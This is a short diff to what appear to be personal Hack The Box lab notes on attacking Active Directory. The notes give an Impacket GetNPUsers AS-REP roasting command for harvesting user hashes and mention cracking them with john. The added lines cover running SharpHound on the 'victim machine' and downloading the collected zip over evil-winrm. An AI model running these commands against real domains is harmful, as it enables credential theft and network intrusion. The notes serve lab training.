@@ -40,3 +40,17 @@ Following command can be use to get the hash of users ( AS-REP Roasting attack: 
 Impacket-GetNPUsers htb.local/ -usersfile domain-users.txt -outputfile hashes-domain-users.txt -dc-ip 10.XX.XX.XX
 
 We can crack the hash which we got from above command through john
+
+For Privillege escalation we can use a tool call Sharphound:
+
+/usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1
+
+transfer the above file in victim machine and run with following command:
+
+invoke-bloodhound -collectionmethod all
+
+Above command will generate a zip file, transfer it to your kali machine, if you are connected using evil-winrm you can run following command to download files:
+
+download 20250201165854_BloodHound.zip
+
+
